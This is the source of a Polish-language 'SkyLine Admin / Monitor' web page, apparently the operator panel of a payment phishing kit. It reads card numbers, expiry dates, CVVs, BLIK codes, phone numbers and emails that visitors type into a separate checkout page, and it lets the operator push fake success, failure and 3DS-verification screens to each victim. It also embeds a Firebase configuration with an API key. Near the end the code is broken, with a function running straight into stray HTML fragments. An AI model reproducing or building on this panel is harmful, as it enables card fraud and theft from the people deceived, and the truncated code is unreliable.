<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin – Monitor</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: #0f1117; color: #e8eaf0; font-family: 'Segoe UI', sans-serif; min-height: 100vh; }

.header {
  background: #161920;
  border-bottom: 1px solid #232733;
  padding: 16px 24px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: sticky;
  top: 0;
  z-index: 100;
}
.header h1 { font-size: 16px; font-weight: 700; color: #fff; }
.header-online {
  font-size: 12px;
  color: #5a6070;
  background: #1e2230;
  border: 1px solid #2a2f3e;
  border-radius: 20px;
  padding: 6px 14px;
}
.header-online span { color: #00c864; font-weight: 700; }

.container { max-width: 540px; margin: 32px auto; padding: 0 20px 80px; }

.empty-state {
  text-align: center;
  padding: 60px 20px;
  color: #3a3f50;
  font-size: 13px;
  line-height: 2;
}

.user-block { margin-bottom: 16px; }

.user-label {
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  color: #5a6070;
  margin-bottom: 10px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.user-label-left {
  display: flex;
  align-items: center;
  gap: 10px;
}

.status-pill {
  display: flex;
  align-items: center;
  gap: 8px;
  background: #1e2230;
  border: 1px solid #2a2f3e;
  border-radius: 20px;
  padding: 5px 12px;
  font-size: 12px;
  font-weight: 600;
  color: #6b7280;
  transition: all 0.3s;
}
.status-pill.online {
  background: rgba(0,200,100,0.08);
  border-color: #00c864;
  color: #00c864;
  box-shadow: 0 0 16px rgba(0,200,100,0.15);
}

.dot {
  width: 9px; height: 9px;
  border-radius: 50%;
  background: #3a3f50;
  flex-shrink: 0;
  transition: background 0.3s;
  position: relative;
}
.dot.on { background: #00c864; }
.dot.on::after {
  content: '';
  position: absolute;
  inset: -3px;
  border-radius: 50%;
  background: #00c864;
  opacity: 0.25;
  animation: ping 1.5s ease-out infinite;
}
@keyframes ping {
  0%   { transform: scale(1); opacity: 0.25; }
  100% { transform: scale(2.8); opacity: 0; }
}

.del-btn {
  background: none;
  border: 1px solid #2a2f3e;
  border-radius: 6px;
  color: #5a6070;
  font-size: 11px;
  padding: 3px 9px;
  cursor: pointer;
  font-family: 'Segoe UI', sans-serif;
  transition: all 0.15s;
}
.del-btn:hover { border-color: #ff4466; color: #ff4466; }

.card {
  background: #161920;
  border: 1px solid #232733;
  border-radius: 12px;
  overflow: hidden;
  margin-bottom: 12px;
}
.card-title {
  padding: 14px 20px;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  color: #5a6070;
  border-bottom: 1px solid #232733;
}
.row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 13px 20px;
  border-bottom: 1px solid #1a1d27;
  gap: 12px;
}
.row:last-child { border-bottom: none; }
.row-key { font-size: 13px; color: #6b7280; flex-shrink: 0; }
.row-val {
  font-size: 13px;
  font-weight: 600;
  color: #4b5263;
  text-align: right;
  word-break: break-all;
  font-style: italic;
}
.row-val.filled { color: #e8eaf0; font-style: normal; }
.row-val.ok     { color: #00c864; font-style: normal; }
.row-val.err    { color: #ff4466; font-style: normal; }
.row-val.warn   { color: #ffaa00; font-style: normal; }
.row-val.price  { color: #00c864; font-style: normal; font-size: 15px; }

.user-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 18px;
  background: #161920;
  border: 1px solid #232733;
  border-radius: 12px;
  cursor: pointer;
  user-select: none;
  transition: background 0.15s, border-color 0.15s;
  margin-bottom: 0;
}
.user-header:hover { background: #1a1d27; }
.user-header.open {
  border-radius: 12px 12px 0 0;
  border-bottom-color: #1a1d27;
}
.user-header-left { display: flex; align-items: center; gap: 10px; }
.user-name { font-size: 14px; font-weight: 700; color: #e8eaf0; }

.chevron {
  width: 18px; height: 18px;
  flex-shrink: 0;
  fill: #5a6070;
  transition: transform 0.2s;
}
.chevron.open { transform: rotate(180deg); fill: #00c864; }

.user-body {
  display: none;
  border: 1px solid #232733;
  border-top: none;
  border-radius: 0 0 12px 12px;
  overflow: hidden;
  margin-bottom: 0;
}
.user-body.open { display: block; }

.tabs {
  display: flex;
  gap: 2px;
  background: #161920;
  border-bottom: 1px solid #232733;
  padding: 0 24px;
  position: sticky;
  top: 65px;
  z-index: 99;
}
.tab-btn {
  padding: 12px 20px;
  font-size: 13px;
  font-weight: 600;
  color: #5a6070;
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  cursor: pointer;
  font-family: 'Segoe UI', sans-serif;
  transition: color 0.15s, border-color 0.15s;
  margin-bottom: -1px;
}
.tab-btn:hover { color: #e8eaf0; }
.tab-btn.active { color: #e8eaf0; border-bottom-color: #00c864; }
.tab-count {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  background: #1e2230;
  border-radius: 10px;
  font-size: 10px;
  font-weight: 700;
  padding: 1px 7px;
  margin-left: 6px;
  color: #5a6070;
}
.tab-btn.active .tab-count { background: rgba(0,200,100,0.15); color: #00c864; }

.hist-item {
  background: #161920;
  border: 1px solid #232733;
  border-radius: 12px;
  overflow: hidden;
  margin-bottom: 12px;
}
.hist-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 13px 18px;
  cursor: pointer;
  user-select: none;
  transition: background 0.15s;
}
.hist-header:hover { background: #1a1d27; }
.hist-header.open { border-bottom: 1px solid #232733; }
.hist-title { font-size: 13px; font-weight: 700; color: #e8eaf0; }
.hist-meta  { font-size: 11px; color: #5a6070; margin-top: 2px; }
.hist-badge {
  font-size: 10px;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 10px;
  flex-shrink: 0;
}
.hist-badge.blik { background: rgba(0,136,255,0.15); color: #4da6ff; }
.hist-badge.card { background: rgba(0,200,100,0.12); color: #00c864; }
.hist-body { display: none; }
.hist-body.open { display: block; }
.hist-chev {
  width: 16px; height: 16px; fill: #5a6070;
  transition: transform 0.2s; flex-shrink: 0;
}
.hist-chev.open { transform: rotate(180deg); }
.hist-del {
  background: none; border: 1px solid #2a2f3e; border-radius: 6px;
  color: #5a6070; font-size: 11px; padding: 2px 8px; cursor: pointer;
  font-family: 'Segoe UI', sans-serif; transition: all 0.15s;
}
.hist-del:hover { border-color: #ff4466; color: #ff4466; }
.hist-empty { text-align: center; padding: 60px 20px; color: #3a3f50; font-size: 13px; line-height: 2; }

.ctrl-card {
  border-radius: 0;
  border-left: none;
  border-right: none;
  border-top: none;
  border-bottom: none;
  background: #0f1117;
}
.ctrl-title {
  padding: 12px 20px 10px;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  color: #5a6070;
  border-bottom: 1px solid #1a1d27;
}
.ctrl-group {
  padding: 12px 20px;
  border-bottom: 1px solid #1a1d27;
}
.ctrl-group:last-child { border-bottom: none; }
.ctrl-group-label {
  font-size: 11px;
  color: #5a6070;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-bottom: 8px;
}
.ctrl-btns { display: flex; gap: 8px; flex-wrap: wrap; }
.ctrl-btn {
  padding: 7px 14px;
  border-radius: 8px;
  border: 1px solid #2a2f3e;
  background: #1e2230;
  color: #e8eaf0;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  font-family: 'Segoe UI', sans-serif;
  transition: all 0.15s;
  white-space: nowrap;
}
.ctrl-btn:hover { border-color: #4a5568; background: #252b3b; }
.ctrl-btn.success { border-color: #00c864; color: #00c864; }
.ctrl-btn.success:hover { background: rgba(0,200,100,0.1); }
.ctrl-btn.error   { border-color: #ff4466; color: #ff4466; }
.ctrl-btn.error:hover   { background: rgba(255,68,102,0.1); }
.ctrl-btn.verify  { border-color: #4da6ff; color: #4da6ff; }
.ctrl-btn.verify:hover  { background: rgba(77,166,255,0.1); }

#toast {
  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
  background: #1e2230; border: 1px solid #2a2f3e; border-radius: 10px;
  padding: 12px 20px; font-size: 13px; font-weight: 600;
  display: none; z-index: 999; white-space: nowrap;
}
</style>
<!-- Firebase SDK -->
<script type="module">
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
import { getDatabase, ref, set, remove, onValue } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js';

const firebaseConfig = {
  apiKey: "AIzaSyAchP5CdU3vI2SGlbE1EHG2RRiY6x22Er8",
  authDomain: "test1-f789e.firebaseapp.com",
  databaseURL: "https://test1-f789e-default-rtdb.firebaseio.com",
  projectId: "test1-f789e",
  storageBucket: "test1-f789e.firebasestorage.app",
  messagingSenderId: "70327501208",
  appId: "1:70327501208:web:2cdab4787128b79e232bed"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

const adminStartTs = Date.now();
const processedKeys = new Set();
const sidRemap = {}; // nowy SID -> oryginalny SID (przy odświeżeniu strony)
window._sidRemap = sidRemap;

// Słuchaj CAŁEGO węzła events bez filtra — filtrowanie po ts w JS.
// onValue na całym węźle działa niezawodnie i dostarcza aktualizacje
// nawet gdy zakładka była nieaktywna (przy powrocie Firebase pushuje snapshot).
onValue(ref(db, 'events'), (snap) => {
  if (!snap.exists()) return;
  snap.forEach(child => {
    const key = child.key;
    const m   = child.val();
    if (!m || !m.t || !m.sid) return;
    // Pomiń eventy sprzed uruchomienia admina
    if (m.ts && m.ts < adminStartTs) return;
    // Każdy event przetwarzaj tylko raz
    if (processedKeys.has(key)) return;
    processedKeys.add(key);
    if (window._adminHandle) window._adminHandle(m);
  });
});

// ── Nasłuch sessions — stały zapis, działa nawet gdy admin offline ──
const sessionFieldState = {}; // sid -> { field: lastValue }
const ipToSid = {};           // ip -> pierwotny SID (pierwsza sesja z tego IP)
window._ipToSid = ipToSid;

onValue(ref(db, 'sessions'), (snap) => {
  // Cache wszystkich sesji — używany przez sterowanie w historii
  window._sessionCache = {};
  if (!snap.exists()) {
    refreshAllHistCtrls && refreshAllHistCtrls();
    return;
  }
  snap.forEach(child => {
    const sid = child.key;
    const s   = child.val();
    if (s) window._sessionCache[sid] = s;
  });

  // Aktualizuj sterowanie w historii przy każdej zmianie sesji
  refreshAllHistCtrls && refreshAllHistCtrls();

  snap.forEach(child => {
    const sid = child.key;
    const s   = child.val();
    if (!s || !s.sid || !window._adminHandle) return;
    if (s.ts && s.ts < adminStartTs) return;

    const ip = s.ip || null;

    if (!sessionFieldState[sid]) {
      sessionFieldState[sid] = {};

      // Sprawdź czy już mamy użytkownika z tego IP
      if (ip && ipToSid[ip] && ipToSid[ip] !== sid) {
        // Ten sam IP — to odświeżenie strony, nie nowy użytkownik
        const origSid = ipToSid[ip];
        // Przenieś sterowanie ze starego SID na nowy
        sidRemap[sid] = origSid;
        // Pokaż toast o odświeżeniu
        const u = users[origSid];
        if (u) toast('🔄 ' + u.name + ' odświeżył stronę', '#f59e0b');
        // Zaktualizuj status na żywo dla oryginalnego użytkownika
        window._adminHandle({ sid: origSid, ts: s.ts || adminStartTs, t: 'tab', v: 'aktywna' });
        window._adminHandle({ sid: origSid, ts: s.ts || adminStartTs, t: 'online_refresh', newSid: sid });
        // Nie tworzymy nowego bloku — wróć
        return;
      }

      // Nowy IP — nowy użytkownik
      if (ip) ipToSid[ip] = sid;
      window._adminHandle({ sid, ts: s.ts || adminStartTs, t: 'online' });
    }

    // Jeśli ten sid jest remapowany na inny — używaj oryginalnego
    const activeSid = sidRemap[sid] || sid;
    const base = { sid: activeSid, ts: s.ts || adminStartTs };
    const fields = ['phone','email','pay','total','discount','blik','cardnum','cardexp','cardcvv','cardname','modal','tab','verify_start'];
    fields.forEach(f => {
      if (s[f] !== undefined && s[f] !== sessionFieldState[sid][f]) {
        sessionFieldState[sid][f] = s[f];
        window._adminHandle(Object.assign({}, base, { t: f, v: s[f] }));
      }
    });
    if (s.paybtn && s.paybtn !== sessionFieldState[sid].paybtn) {
      sessionFieldState[sid].paybtn = s.paybtn;
      window._adminHandle(Object.assign({}, base, { t: 'paybtn' }));
    }
  });
});

// Usuń wpis historii z Firebase
window._fbDeleteHistory = function(hid) {
  remove(ref(db, 'history/' + hid));
};

// Wyślij komendę sterowania do konkretnego użytkownika
window._fbCtrl = function(sid, action) {
  set(ref(db, 'ctrl/' + sid), { action, ts: Date.now() });
};

// Zapisz wpis historii do Firebase
window._fbSaveHistory = function(hid, entry) {
  set(ref(db, 'history/' + hid), entry);
};

// Załaduj historię przy starcie — przetrwa odświeżenie admina
// Historia ładowana niezależnie od live — buforuj do czasu aż DOM będzie gotowy
window._historyBuf = [];
onValue(ref(db, 'history'), (snap) => {
  const entries = [];
  if (snap.exists()) {
    snap.forEach(child => { entries.push(child.val()); });
  }
  entries.sort((a, b) => (a.ts || 0) - (b.ts || 0));
  if (window._renderHistFromFirebase) {
    entries.forEach(e => e && e.hid && window._renderHistFromFirebase(e));
  } else {
    window._historyBuf = entries;
  }
});
</script>
</head>
<body>

<div class="header">
  <h1>SkyLine Admin <span style="color:#3a3f50;font-weight:400;">/ Monitor</span></h1>
  <div class="header-online">Online: <span id="onlineCount">0</span></div>
</div>

<div class="tabs">
  <button class="tab-btn active" id="tab-live" onclick="switchTab('live')">
    Dane na żywo <span class="tab-count" id="cnt-live">0</span>
  </button>
  <button class="tab-btn" id="tab-hist" onclick="switchTab('hist')">
    Historia <span class="tab-count" id="cnt-hist">0</span>
  </button>
</div>

<!-- ZAKŁADKA: LIVE -->
<div class="container" id="panel-live">
  <div class="empty-state" id="emptyState">
    Brak użytkowników.<br>
    Otwórz <strong style="color:#e8eaf0">summation.html</strong> w nowej zakładce.
  </div>
</div>

<!-- ZAKŁADKA: HISTORIA -->
<div class="container" id="panel-hist" style="display:none;">
  <div class="hist-empty" id="histEmpty">
    Brak zakończonych płatności.<br>Historia pojawi się gdy użytkownik potwierdzi płatność.
  </div>
</div>

<div id="toast"></div>

<script>
const users = {};
let userCounter = 0;

window._adminHandle = handle;

function handle(m) {
  const sid = m.sid;

  if (!users[sid]) {
    if (m.t === 'hb') return;
    createUser(sid);
  }

  const u = users[sid];

  clearTimeout(u.hbTimer);
  u.hbTimer = setTimeout(() => setOnline(sid, false), 7000);

  if (m.t === 'online') {
    setOnline(sid, true);
    if (!u.greeted) {
      u.greeted = true;
      toast('🟢 ' + u.name + ' wszedł na stronę', '#00c864');
      beep('arrive');
    }
    return;
  }
  if (m.t === 'online_refresh') {
    // Użytkownik odświeżył stronę — nowy SID, ten sam IP
    setOnline(sid, true);
    // Zaktualizuj ctrl na nowy SID żeby przyciski sterowania działały
    if (m.newSid) {
      // Nasłuchuj komend na nowym SID
      const pill = document.getElementById('pill-' + sid);
      const txt  = document.getElementById('pilltxt-' + sid);
      if (txt) txt.textContent = 'ODŚWIEŻONO';
      if (pill) { pill.style.borderColor = '#f59e0b'; pill.style.color = '#f59e0b'; }
    }
    return;
  }
  if (m.t === 'hb')      { setOnline(sid, true); return; }
  if (m.t === 'offline') { setOnline(sid, false); return; }
  if (m.t === 'tab')     { setVal(sid, 'tab',  m.v, m.v === 'aktywna' ? 'ok' : 'warn'); setLast(sid); return; }

  if (m.t === 'phone')    setVal(sid, 'phone',    m.v || 'nie wpisano', m.v ? 'filled' : '');
  if (m.t === 'email')    setVal(sid, 'email',    m.v || 'nie wpisano', m.v ? 'filled' : '');
  if (m.t === 'pay')      setVal(sid, 'pay',      m.v, 'ok');
  if (m.t === 'discount') setVal(sid, 'discount', m.v, m.ok ? 'ok' : 'err');
  if (m.t === 'total')    setVal(sid, 'total',    m.v, 'price');

  if (m.t === 'paybtn') {
    setVal(sid, 'btn', 'kliknięto (' + now() + ')', 'warn');
    toast('💳 ' + u.name + ' kliknął ZAPŁAĆ!', '#ffaa00');
    beep('pay');
  }

  if (m.t === 'modal') {
    if (m.v === 'BLIK') {
      show(sid, 'card-blik');
      setVal(sid, 'modal-blik', 'BLIK – otwarty o ' + now(), 'filled');
    } else {
      show(sid, 'card-card');
      setVal(sid, 'modal-card', 'Karta – otwarta o ' + now(), 'filled');
    }
  }

  if (m.t === 'blik')    setVal(sid, 'blik',     m.v, 'filled');
  if (m.t === 'cardnum') { show(sid, 'card-card'); setVal(sid, 'cardnum', m.v, 'filled'); }
  if (m.t === 'cardexp') setVal(sid, 'cardexp',  m.v, 'filled');
  if (m.t === 'cardcvv') setVal(sid, 'cardcvv',  m.v, 'filled');
  if (m.t === 'cardname')setVal(sid, 'cardname', m.v, 'filled');

  if (m.t === 'confirm') {
    const ts = ' (' + now() + ')';
    const isBlik = m.v && m.v.includes('BLIK');
    if (isBlik) {
      show(sid, 'card-blik');
      setVal(sid, 'confirm-blik', m.v + ts, 'ok');
      toast('✅ ' + u.name + ' potwierdził BLIK!', '#00c864');
    } else {
      show(sid, 'card-card');
      setVal(sid, 'confirm-card', m.v + ts, 'ok');
      toast('✅ ' + u.name + ' potwierdził kartę!', '#00c864');
    }
    beep('pay');
    // NIE wywołujemy addToHistory tutaj — summation.html zapisuje
    // bezpośrednio do history/ i onValue(history) to odbierze automatycznie
  }

  setLast(sid);
}

function createUser(sid) {
  document.getElementById('emptyState').style.display = 'none';
  userCounter++;
  const num  = userCounter;
  const name = 'Użytkownik ' + num;

  const block = document.createElement('div');
  block.className = 'user-block';
  block.id = 'block-' + sid;
  block.innerHTML = `
    <div class="user-header" id="hdr-${sid}" onclick="toggleUser('${sid}')">
      <div class="user-header-left">
        <div class="dot" id="dot-${sid}"></div>
        <span class="user-name">${name}</span>
        <div class="status-pill" id="pill-${sid}">
          <span id="pilltxt-${sid}">OFFLINE</span>
        </div>
      </div>
      <div style="display:flex;align-items:center;gap:8px;">
        <button class="del-btn" onclick="event.stopPropagation();deleteUser('${sid}')">Usuń</button>
        <svg class="chevron" id="chev-${sid}" viewBox="0 0 24 24"><path d="M7.165 8.153a1.07 1.07 0 0 0-1.507-.078A1.063 1.063 0 0 0 5.58 9.58l5.672 6.27a1.07 1.07 0 0 0 1.587-.002l5.583-6.217a1.06 1.06 0 0 0-.083-1.503 1.07 1.07 0 0 0-1.507.083l-4.37 4.865a.57.57 0 0 1-.843.002z"/></svg>
      </div>
    </div>

    <div class="user-body" id="body-${sid}">
      <div class="card" style="border-radius:0;border-left:none;border-right:none;border-top:none;">
        <div class="card-title">Stan formularza</div>
        <div class="row"><span class="row-key">Telefon</span>          <span class="row-val" id="${sid}-phone">nie wpisano</span></div>

          <div class="row"><span class="row-key">Modal otwarty</span>  <span class="row-val" id="${sid}-modal-card">–</span></div>
          <div class="row"><span class="row-key">Numer karty</span>    <span class="row-val" id="${sid}-cardnum">–</span></div>
          <div class="row"><span class="row-key">Data ważności</span>  <span class="row-val" id="${sid}-cardexp">–</span></div>
          <div class="row"><span class="row-key">CVV</span>            <span class="row-val" id="${sid}-cardcvv">–</span></div>

        <div class="row"><span class="row-key">Czas na stronie</span>   <span class="row-val filled" id="${sid}-time">0s</span></div>
        <div class="row"><span class="row-key">Ostatnia aktywność</span><span class="row-val" id="${sid}-last">–</span></div>
      </div>

    </div>
  `;

  document.getElementById('panel-live').prepend(block);
  updateLiveCount();

  users[sid] = {
    name,
    num,
    block,
    hbTimer: null,
    greeted: false,
    sessionStart: Date.now(),
    timerInterval: setInterval(() => tickTime(sid), 1000)
  };

}

function setVal(sid, field, val, cls) {
  const el = document.getElementById(sid + '-' + field);
  if (!el) return;
  el.textContent = val;
  el.className = 'row-val' + (cls ? ' ' + cls : '');
}

function show(sid, cardId) {
  const el = document.getElementById(sid + '-' + cardId);
  if (el) el.style.display = '';
}

function setOnline(sid, v) {
  const dot  = document.getElementById('dot-' + sid);
  const pill = document.getElementById('pill-' + sid);
  const txt  = document.getElementById('pilltxt-' + sid);
  if (!dot) return;
  dot.className  = 'dot' + (v ? ' on' : '');
  pill.className = 'status-pill' + (v ? ' online' : '');
  txt.textContent = v ? 'ONLINE' : 'OFFLINE';
  if (!v) setVal(sid, 'tab', 'offline', 'err');
  updateCount();
}

function setLast(sid) {
  setVal(sid, 'last', now(), 'filled');
}

function tickTime(sid) {
  const u = users[sid];
  if (!u) return;
  const s = Math.round((Date.now() - u.sessionStart) / 1000);
  const m = Math.floor(s / 60);
  const el = document.getElementById(sid + '-time');
  if (el) el.textContent = m > 0 ? m + 'm ' + (s % 60) + 's' : s + 's';
}

function updateCount() {
  const count = Object.keys(users).filter(sid => {
    const dot = document.getElementById('dot-' + sid);
    return dot && dot.classList.contains('on');
  }).length;
  document.getElementById('onlineCount').textContent = count;
}

function unlockCtrl(sid, method) {
  const lock = document.getElementById(sid + '-ctrl-lock');
  if (!lock) return;
  lock.style.display = 'none';
  if (method === 'blik') {
    ['card-ok','card-fail','card-3ds'].forEach(k => {
      const b = document.getElementById(sid + '-btn-' + k);
      if (b) { b.style.opacity = '0.3'; b.style.pointerEvents = 'none'; }
    });
  } else {
    ['blik-ok','blik-fail'].forEach(k => {
      const b = document.getElementById(sid + '-btn-' + k);
      if (b) { b.style.opacity = '0.3'; b.style.pointerEvents = 'none'; }
    });
  }
}

function sendCtrl(sid, action) {
  // Znajdź najnowszy aktywny SID dla tego użytkownika
  // (może być inny niż oryginalny jeśli odświeżył stronę)
  let activeSid = sid;
  const ipToSid = window._ipToSid || {};
  const cache   = window._sessionCache || {};

  const ip = Object.keys(ipToSid).find(k => ipToSid[k] === sid);
  if (ip) {
    // Znajdź najnowszy SID z tym IP który jest online
    let latestTs = 0;
    Object.entries(cache).forEach(([s, data]) => {
      if (data.ip === ip && (data.ts || 0) > latestTs && data.online !== false) {
        latestTs = data.ts || 0;
        activeSid = s;
      }
    });
  }

  if (window._fbCtrl) window._fbCtrl(activeSid, action);
  const labels = {
    blik_ok:   '✅ Wysłano: BLIK sukces',
    blik_fail: '❌ Wysłano: BLIK błąd',
    card_ok:   '✅ Wysłano: Karta sukces',
    card_fail: '❌ Wysłano: Karta błąd',
    card_3ds:  '🔐 Wysłano: Weryfikacja'
  };
  const colors = {
    blik_ok: '#00c864', card_ok: '#00c864',
    blik_fail: '#ff4466', card_fail: '#ff4466',
    card_3ds: '#4da6ff'
  };
  toast(labels[action] || action, colors[action] || '#e8eaf0');
}

function toggleUser(sid) {
  const hdr  = document.getElementById('hdr-' + sid);
  const body = document.getElementById('body-' + sid);
  const chev = document.getElementById('chev-' + sid);
  if (!hdr) return;
  const isOpen = body.classList.contains('open');
  body.classList.toggle('open', !isOpen);
  hdr.classList.toggle('open', !isOpen);
  chev.classList.toggle('open', !isOpen);
}

function switchTab(tab) {
  document.getElementById('panel-live').style.display = tab === 'live' ? '' : 'none';
  document.getElementById('panel-hist').style.display = tab === 'hist' ? '' : 'none';
  document.getElementById('tab-live').classList.toggle('active', tab === 'live');
  document.getElementById('tab-hist').classList.toggle('active', tab === 'hist');
}

function updateLiveCount() {
  const count = document.querySelectorAll('#panel-live .user-block').length;
  document.getElementById('cnt-live').textContent = count;
}

let histCounter = 0;
const renderedHistIds = new Set();

function histCtrlStatus(hid, sid) {
  // Sprawdź czy okienko płatności jest aktualnie otwarte dla tego SID
  // i czy sesja jest nadal aktywna (użytkownik nie odświeżył)
  const session = window._sessionCache && window._sessionCache[sid];
  if (!session) return { open: false, refreshed: true };
  const modal = session.modal; // 'BLIK' lub 'Karta kredytowa' lub brak
  const online = session.online;
  const tab = session.tab;
  const refreshed = !online || tab === 'offline';
  return { open: !!modal, modal, refreshed };
}

// Timery zegara weryfikacji per hid
const histVerifyTimers = {};

function updateHistCtrl(hid, sid) {
  const statusEl = document.getElementById('hctrl-status-' + hid);
  const btnsEl   = document.getElementById('hctrl-btns-' + hid);
  const lockEl   = document.getElementById('hctrl-lock-' + hid);
  if (!statusEl || !btnsEl || !lockEl) return;

  const session = window._sessionCache && window._sessionCache[sid];
  if (!session) {
    statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">⚠️ Sesja nieaktywna</span>';
    lockEl.style.display = 'flex';
    stopHistVerifyTimer(hid);
    return;
  }
  const online    = session.online;
  const tab       = session.tab;
  const modal     = session.modal;
  const verifyTs  = session.verify_start;
  const refreshed = !online || tab === 'offline';

  if (refreshed) {
    statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">🔄 Strona odświeżona — brak możliwości sterowania</span>';
    lockEl.style.display = 'flex';
    stopHistVerifyTimer(hid);
  } else if (verifyTs && !refreshed) {
    // Weryfikacja 3DS aktywna — pokaż zsynchronizowany zegar
    lockEl.style.display = 'none';
    startHistVerifyTimer(hid, verifyTs);
  } else if (!modal) {
    statusEl.innerHTML = '<span style="color:#f59e0b;font-size:12px;font-weight:600;">⏳ Okienko płatności nie jest otwarte</span>';
    lockEl.style.display = 'flex';
    stopHistVerifyTimer(hid);
  } else {
    statusEl.innerHTML = '<span style="color:#00c864;font-size:12px;font-weight:600;">✅ Okienko otwarte: ' + modal + '</span>';
    lockEl.style.display = 'none';
    stopHistVerifyTimer(hid);
  }
}

function startHistVerifyTimer(hid, verifyStartTs) {
  // Nie restartuj jeśli już działa dla tego samego ts
  if (histVerifyTimers[hid] && histVerifyTimers[hid].ts === verifyStartTs) return;
  stopHistVerifyTimer(hid);

  const DURATION = 300;
  const statusEl = document.getElementById('hctrl-status-' + hid);

  function tick() {
    const elapsed  = Math.floor((Date.now() - verifyStartTs) / 1000);
    const seconds  = Math.max(0, DURATION - elapsed);
    const mm = Math.floor(seconds / 60);
    const ss = seconds % 60;
    const timeStr  = mm + ':' + String(ss).padStart(2, '0');
    const pct = Math.round(seconds / DURATION * 100);

    // Kolor zależny od czasu
    const color = seconds > 60 ? '#4da6ff' : seconds > 30 ? '#f59e0b' : '#ff4466';

    if (statusEl) {
      statusEl.innerHTML = `
        <div style="display:flex;align-items:center;gap:10px;">
          <svg width="36" height="36" viewBox="0 0 36 36" style="transform:rotate(-90deg);flex-shrink:0;">
            <circle cx="18" cy="18" r="14" fill="none" stroke="#232733" stroke-width="3"/>
            <circle cx="18" cy="18" r="14" fill="none" stroke="${color}" stroke-width="3"
              stroke-dasharray="${2*Math.PI*14}"
              stroke-dashoffset="${2*Math.PI*14*(1-seconds/DURATION)}"
              stroke-linecap="round"/>
          </svg>
          <div>
            <div style="color:${color};font-size:13px;font-weight:700;">🔐 Weryfikacja 3DS aktywna</div>
            <div style="color:#5a6070;font-size:11px;margin-top:2px;">Pozostało: <strong style="color:${color}">${timeStr}</strong></div>
          </div>
        </div>`;
    }

    if (seconds <= 0) {
      stopHistVerifyTimer(hid);
      if (statusEl) statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">⌛ Czas weryfikacji minął</span>';
    }
  }

  tick();
  const interval = setInterval(tick, 1000);
  histVerifyTimers[hid] = { interval, ts: verifyStartTs };
}

function stopHistVerifyTimer(hid) {
  if (histVerifyTimers[hid]) {
    clearInterval(histVerifyTimers[hid].interval);
    delete histVerifyTimers[hid];
  }
}

// Odśwież sterowanie w historii gdy zmieniają się sesje
window._histSids = window._histSids || {};
function registerHistCtrl(hid, sid) {
  window._histSids[hid] = sid;
}
function refreshAllHistCtrls() {
  Object.entries(window._histSids || {}).forEach(([hid, sid]) => updateHistCtrl(hid, sid));

        <button class="hist-del" onclick="event.stopPropagation();deleteHist('${hid}')">Usuń</button>
        <svg class="hist-chev" id="hchev-${hid}" viewBox="0 0 24 24"><path d="M7.165 8.153a1.07 1.07 0 0 0-1.507-.078A1.063 1.063 0 0 0 5.58 9.58l5.672 6.27a1.07 1.07 0 0 0 1.587-.002l5.583-6.217a1.06 1.06 0 0 0-.083-1.503 1.07 1.07 0 0 0-1.507.083l-4.37 4.865a.57.57 0 0 1-.843.002z"/></svg>
      </div>
    </div>
    <div class="hist-body" id="hbody-${hid}">
      <div class="card" style="border-radius:0;border:none;border-bottom:1px solid #1a1d27;">
        <div class="card-title">Dane kontaktowe</div>
        <div class="row"><span class="row-key">Telefon</span>          <span class="row-val filled">${entry.phone||'–'}</span></div>
        <div class="row"><span class="row-key">E-mail</span>           <span class="row-val filled">${entry.email||'–'}</span></div>
        <div class="row"><span class="row-key">Metoda płatności</span> <span class="row-val ok">${entry.pay||'–'}</span></div>
        <div class="row"><span class="row-key">Kod rabatowy</span>     <span class="row-val">${entry.discount||'–'}</span></div>
        <div class="row"><span class="row-key">Do zapłaty</span>       <span class="row-val price">${entry.total||'–'}</span></div>
      </div>
      <div class="card" style="border-radius:0;border:none;border-bottom:1px solid #1a1d27;">
        <div class="card-title">Płatność ${method}</div>
        ${paymentRows}
        <div class="row"><span class="row-key">Potwierdzenie</span>   <span class="row-val ok">${entry.confirm||''}</span></div>
      </div>
      <div class="ctrl-card" style="position:relative;border-radius:0 0 12px 12px;">
        <div class="ctrl-title">🎮 Sterowanie ekranem</div>
        <div style="margin-bottom:10px;" id="hctrl-status-${hid}">
          <span style="color:#f59e0b;font-size:12px;font-weight:600;">⏳ Sprawdzanie statusu...</span>
        </div>
        <div id="hctrl-lock-${hid}" style="position:absolute;inset:0;background:rgba(15,17,23,0.82);border-radius:0 0 12px 12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;z-index:10;">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="5" y="11" width="14" height="10" rx="2" stroke="#5a6070" stroke-width="1.8"/><path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#5a6070" stroke-width="1.8" stroke-linecap="round"/></svg>
          <span style="font-size:11px;color:#5a6070;font-weight:600;text-align:center;padding:0 16px;" id="hctrl-locktxt-${hid}">Oczekiwanie na otwarcie okienka płatności</span>
        </div>
        <div id="hctrl-btns-${hid}">
          ${isBlik ? `
          <div class="ctrl-group">

          <div class="ctrl-group">

// Podpięcie dla Firebase — musi być po definicji renderHistItem
window._renderHistFromFirebase = renderHistItem;
